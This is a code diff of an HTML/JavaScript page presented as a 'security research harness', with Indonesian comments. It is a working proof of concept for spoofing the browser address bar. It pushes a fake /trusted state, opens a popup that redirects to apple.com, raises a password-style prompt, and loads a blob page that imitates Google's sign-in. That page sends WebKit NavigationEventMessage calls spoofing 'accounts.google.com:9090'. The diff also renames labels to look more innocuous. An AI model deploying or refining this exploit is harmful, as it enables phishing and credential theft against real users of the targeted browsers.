@@ -2,36 +2,35 @@
 <html lang="en">
 <head>
     <meta charset="utf-8">
-    <title>CVE-2026-95291 All-in-One Consolidated Harness (Custom Port)</title>
+    <title>Advanced Security Research Harness - Stabilized</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 2em; background: #020617; color: #f8fafc; }
-        .container { max-width: 750px; margin: 40px auto; background: #0f172a; padding: 2.5em; border-radius: 12px; border: 1px solid #1e293b; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.9); }
+        .container { max-width: 800px; margin: 40px auto; background: #0f172a; padding: 2.5em; border-radius: 12px; border: 1px solid #1e293b; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.9); }
         h2 { color: #38bdf8; margin-top: 0; font-size: 24px; border-bottom: 2px solid #1e293b; padding-bottom: 12px; }
         p { color: #94a3b8; font-size: 14px; line-height: 1.6; }
-        .btn { display: block; width: 100%; margin-top: 1.5em; padding: 0.9em 1.6em; background: #6366f1; color: white; border: none; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; transition: background 0.2s, transform 0.1s; text-align: center; }
+        .btn { display: block; width: 100%; margin-top: 1em; padding: 0.9em 1.6em; background: #6366f1; color: white; border: none; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; transition: background 0.2s; text-align: center; }
         .btn:hover { background: #4f46e5; }
-        .btn:active { transform: scale(0.99); }
         #panel { display: none; background: #1e293b; padding: 15px; border-radius: 6px; margin-top: 15px; border: 1px solid #334155; font-size: 13px; color: #38bdf8; }
-        #terminal { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; font-size: 12px; margin-top: 1.5em; background: #000000; padding: 1.2em; border: 1px solid #1e293b; border-radius: 6px; color: #4ade80; white-space: pre-wrap; max-height: 300px; overflow-y: auto; }
+        #terminal { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; font-size: 12px; margin-top: 1.5em; background: #000000; padding: 1.2em; border: 1px solid #1e293b; border-radius: 6px; color: #4ade80; white-space: pre-wrap; max-height: 280px; overflow-y: auto; }
         .badge { display: inline-block; padding: 4px 10px; border-radius: 6px; font-size: 11px; font-weight: 600; background: #0284c7; color: #fff; margin-bottom: 1em; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>All-in-One Security Research Harness</h2>
-    <span class="badge">Target: PushState + Lifecycle + Native Bridge Fuzzer (:9090)</span>
+    <h2>Stabilized Research & Fuzzing Harness</h2>
+    <span class="badge">Optimized Timing & Synchronized State Flow</span>
     
     <div id="panel">
         <strong>[Trusted State Panel Active]</strong><br>
-        State history berhasil dimodifikasi secara lokal ke jalur /trusted.
+        State history lokal berhasil diperbarui ke /trusted.
     </div>
 
-    <p>Modul riset ini menguji manipulasi state lokal, siklus <code>pageshow</code>, kontainer <code>blob:</code>, serta pengiriman sinyal <code>NavigationEventMessage</code> dengan variasi port non-standar/kustom (<code>:9090</code>).</p>
+    <p>Harness ini mengoptimalkan sinkronisasi timing antara manipulasi state lokal, manajemen jendela pop-up asinkron, dialog interaktif, dan fuzzer Native Bridge dengan port kustom (<code>:9090</code>).</p>
     
-    <button class="btn" id="executeAllBtn">Jalankan Eksekusi All-in-One (:9090)</button>
+    <button class="btn" id="executeAllBtn">Jalankan Eksekusi Stabil</button>
     
-    <div id="terminal">Status: Menunggu eksekusi rangkaian...</div>
+    <div id="terminal">Status: Menunggu inisialisasi rangkaian...</div>
 </div>
 
 <script>
@@ -41,43 +40,91 @@ function logTerm(msg) {
         t.textContent += '\n[' + new Date().toLocaleTimeString() + '] ' + msg;
         t.scrollTop = t.scrollHeight;
     }
-    console.log('[AllInOnePort] ' + msg);
+    console.log('[StableHarness] ' + msg);
 }
 
-// Pemantauan Lifecycle Pageshow
+// Pemantauan Lifecycle Pageshow dengan sinkronisasi rAF
 window.addEventListener('pageshow', (event) => {
     logTerm('Event "pageshow" tertangkap. (persisted: ' + event.persisted + ')');
     requestAnimationFrame(() => {
         requestAnimationFrame(() => {
             setTimeout(() => {
-                logTerm('Siklus double rAF + delay 80ms selesai.');
-            }, 80);
+                logTerm('Siklus rendering frame stabilizer selesai.');
+            }, 50);
         });
     });
 });
 
-// Eksekusi Tunggal (All-in-One Trigger dengan Port Kustom)
 document.getElementById('executeAllBtn').onclick = function() {
-    logTerm('=== MEMULAI RANGKAIAN EKSEKUSI (PORT 9090) ===');
+    this.style.display = 'none';
+    logTerm('=== MEMULAI RANGKAIAN EKSEKUSI STABIL ===');
 
-    // 1. Manipulasi State Lokal & Tampilan Panel
+    // 1. Manipulasi State Lokal & Panel Visual
     try {
         history.pushState({ trustedState: true }, '', '/trusted');
         document.getElementById('panel').style.display = 'block';
-        logTerm('[1/3] history.pushState sukses. URL lokal diperbarui ke /trusted.');
+        logTerm('[1/4] history.pushState sukses ke /trusted.');
     } catch (err) {
-        logTerm('[1/3] Error pushState: ' + err.message);
+        logTerm('[1/4] Error pushState: ' + err.message);
     }
 
-    // 2. Persiapan Payload Native Bridge Fuzzer dengan Port 9090
-    logTerm('[2/3] Mengonfigurasi parameter fuzzer dengan port kustom :9090...');
+    // 2. Pengelolaan Jendela Popup & Sinkronisasi Dokumen
+    logTerm('[2/4] Menginisialisasi konteks popup asinkron...');
+    try {
+        const newTab = window.open("about:blank", "_blank");
+        if (newTab) {
+            // Tulis struktur dokumen dengan penanda waktu riset
+            newTab.document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head><title>Research Overlay - Stabilized</title></head>
+                <body style="margin:0;padding:0;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center">
+                  <div>
+                    <h1 style="font-size:42px;font-weight:bold;color:red;margin:0 0 20px 0">SECURITY RESEARCH OVERLAY</h1>
+                    <p style="font-size:28px;font-weight:bold;color:#007aff;margin:10px 0">SYNC TIMING ACTIVE</p>
+                  </div>
+                </body>
+                </html>
+            `);
+            newTab.document.close();
+            logTerm('[2/4] Konten overlay awal berhasil dirender di tab baru.');
+
+            // Menggunakan jeda waktu terukur untuk kestabilan transisi
+            setTimeout(() => {
+                try {
+                    newTab.location.href = "https://apple.com";
+                    logTerm('[2/4] Navigasi eksternal ke apple.com dipicu.');
+                } catch (navErr) {
+                    logTerm('[2/4] Gagal memicu navigasi eksternal: ' + navErr.message);
+                }
+            }, 250); // Ditingkatkan sedikit untuk stabilitas render lokal
+        } else {
+            logTerm('[2/4] Peringatan: Popup diblokir oleh kebijakan peramban.');
+        }
+    } catch (e) {
+        logTerm('[2/4] Error pada penanganan window.open: ' + e.message);
+    }
+
+    // 3. Prompt Interaktif (Non-blocking flow)
+    setTimeout(function () {
+        try {
+            logTerm('[3/4] Memanggil dialog input interaktif (prompt)...');
+            const pwd = prompt("ROOT CAUSE ANALYSIS - STABLE HARNESS");
+            logTerm('[3/4] Dialog prompt selesai diproses.');
+        } catch (err) {
+            logTerm('[3/4] Prompt dilewati atau diblokir.');
+        }
+    }, 600);
+
+    // 4. Inisialisasi Kontainer Blob & Fuzzer Native Bridge (:9090)
+    logTerm('[4/4] Mempersiapkan payload Native Bridge Fuzzer (port :9090)...');
     var targetVictim = 'accounts.google.com:9090';
     var spoofUrl = 'blob:https://' + targetVictim + '/signin';
     var bypassBaseUrl = 'https://' + targetVictim + '/';
 
     var fuzzerPayload = '<!doctype html>\n' +
     '<meta charset=utf-8>\n' +
-    '<title>Sign in - Research Payload (:9090)</title>\n' +
+    '<title>Sign in - Stable Research Payload (:9090)</title>\n' +
     '<style>\n' +
     '  body { background: #fff; font-family: -apple-system, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }\n' +
     '  .card { border: 1px solid #dadce0; padding: 40px; border-radius: 8px; width: 360px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }\n' +
@@ -87,15 +134,15 @@ document.getElementById('executeAllBtn').onclick = function() {
     '</style>\n' +
     '<div class="card">\n' +
     '  <h2>Sign in</h2>\n' +
-    '  <p>to continue to Google (:9090)</p>\n' +
-    '  <div id="log">Inisialisasi kontainer blob aktif (:9090)...</div>\n' +
+    '  <p>to continue to Research (:9090)</p>\n' +
+    '  <div id="log">Inisialisasi kontainer blob stabil...</div>\n' +
     '</div>\n' +
     '<script>\n' +
     '(function() {\n' +
     '    function innerLog(msg) {\n' +
     '        var el = document.getElementById("log");\n' +
     '        if (el) el.textContent += "\\n" + msg;\n' +
-    '        try { console.log("[fuzzer-inner-9090] " + msg); } catch(e){}\n' +
+    '        try { console.log("[fuzzer-inner-stable] " + msg); } catch(e){}\n' +
     '    }\n' +
     '\n' +
     '    var mh = window.webkit && window.webkit.messageHandlers;\n' +
@@ -138,7 +185,7 @@ document.getElementById('executeAllBtn').onclick = function() {
     '        var fuzzStep = function(attempt) {\n' +
     '            forceRegisterFrame();\n' +
     '            try {\n' +
-    '                innerLog("[*] [Fuzz " + attempt + "] Mengirim willChangeState & didReplaceState (:9090)...");\n' +
+    '                innerLog("[*] [Fuzz " + attempt + "] Mengirim willChangeState & didReplaceState...");\n' +
     '                mh.NavigationEventMessage.postMessage({\n' +
     '                    command: "willChangeState",\n' +
     '                    frame_id: fid\n' +
@@ -151,7 +198,7 @@ document.getElementById('executeAllBtn').onclick = function() {
     '                    baseUrl: "' + bypassBaseUrl + '",\n' +
     '                    pageUrl: "' + spoofUrl + '"\n' +
     '                });\n' +
-    '                innerLog("[+] [Fuzz " + attempt + "] Payload kustom port terkirim ke antrean native.");\n' +
+    '                innerLog("[+] [Fuzz " + attempt + "] Payload terkirim ke antrean native.");\n' +
     '            } catch(err) {\n' +
     '                innerLog("[-] [Fuzz " + attempt + "] Exception: " + err.message);\n' +
     '            }\n' +
@@ -161,25 +208,24 @@ document.getElementById('executeAllBtn').onclick = function() {
     '        setTimeout(function() { fuzzStep(2); }, 200);\n' +
     '        setTimeout(function() { fuzzStep(3); }, 600);\n' +
     '\n' +
-    '    }, 250);\n' +
+    '    }, 300);\n' +
     '})();\n' +
     '<\/script>';
 
-    // 3. Peluncuran Otomatis ke Blob Container
     try {
-        logTerm('[3/3] Membungkus payload dengan port kustom ke dalam kontainer Blob URL...');
+        logTerm('[4/4] Membungkus payload stabil ke dalam kontainer Blob URL...');
         var blobObj = new Blob([fuzzerPayload], { type: 'text/html' });
         var blobUrl = URL.createObjectURL(blobObj);
 
-        logTerm('Blob URL siap: ' + blobUrl);
-        logTerm('Memicu navigasi otomatis...');
+        logTerm('Blob URL stabil siap: ' + blobUrl);
+        logTerm('Memicu navigasi kontainer...');
 
         setTimeout(function() {
             location.href = blobUrl;
-        }, 500);
+        }, 900);
 
     } catch (e) {
-        logTerm('[-] Gagal memproses blob navigation: ' + e.message);
+        logTerm('[-] Gagal memproses navigasi blob: ' + e.message);
     }
 };
 </script>
